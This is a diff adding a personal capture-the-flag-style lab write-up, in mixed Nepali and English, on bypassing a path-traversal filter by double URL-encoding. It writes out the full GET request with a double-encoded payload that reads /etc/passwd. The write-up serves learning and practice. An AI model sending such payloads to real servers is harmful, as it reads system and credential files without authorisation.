@@ -1,0 +1,41 @@
+Lab: File path traversal, traversal sequences stripped with superfluous URL-decode.
+
+Target: retrieve the contents of the /etc/passwd file
+
+Idea: yasle chai path traversal sequences ko input
+block garako xa, yo bypass garna lai url decode garara garnu parcha.
+
+
+Analysis:
+1. paila jastai normal absolute path bata try garchu
+like: /etc/passwd this is not working.
+
+2. let's do: ../../../../etc/passwd it's not working too.
+
+3. Euta kura khyal gar we have to decode it:
+let's URL-decode ../../../../etc/passwd this:
+..= %2e%2e
+/= %2f 
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd 
+ahaaa not working bad request.
+
+4. Try to encode and exploit hai ta:
+I am giving:  ../../../../etc/passwd the url-encode of this is:
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
+when I pass this into GET /image?filename=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64 HTTP/2
+it's still giving me a bad request.
+
+I will encode the encoded url again and try now I will encode the: 
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64 this will be:
+
+%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34%20
+
+so my url will look like:
+GET /image?filename=%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34%20 HTTP/2
+
+NOW THIS TIME I AM ABLE TO BYPASS THE REQUEST congrulations TO ME.
+
+YASMA VAKO ESLE EK CHOTI MATRAI DECODE GARYO TAI FIRST DECODE KO sequences MA
+../ CHECK GARYO TESLE MALAI JANA DENA BUT WHEN I ENCODE IT AGAIN IT DIDN'T CHECK AND I AM ABLE TO directory traversal THE exploit.
+
+HEHE congrulations TO ME.
